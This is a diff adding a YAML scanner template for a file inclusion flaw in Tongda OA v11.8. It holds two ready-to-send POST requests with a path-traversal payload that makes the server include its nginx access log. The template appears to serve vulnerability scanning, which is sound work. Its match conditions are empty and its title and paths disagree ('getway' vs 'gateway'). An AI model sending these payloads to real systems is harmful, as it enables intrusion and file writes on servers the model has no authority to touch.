@@ -1,0 +1,28 @@
+id: tongda-getway-rfi
+brief:
+    title: Tongda OA v11.8 getway.php - Remote File Inclution
+    by: SleepingBag945
+    level: critical
+    about: There is a file inclusion vulnerability in Tongda OA v11.8 getway.php, an attacker sends a malicious request to include a log file, resulting in an arbitrary file writing vulnerability
+    label:
+        - tongda
+        - rfi
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/ispirit/interface/gateway.php'
+      head:
+        Accept-Encoding: gzip
+        Content-Type: application/x-www-form-urlencoded
+      body: json={"url":"/general/../../nginx/logs/oa.access.log"}
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/mac/gateway.php'
+      head:
+        Accept-Encoding: gzip
+        Content-Length: "54"
+        Content-Type: application/x-www-form-urlencoded
+      body: json={"url":"/general/../../nginx/logs/oa.access.log"}
+      signs: []
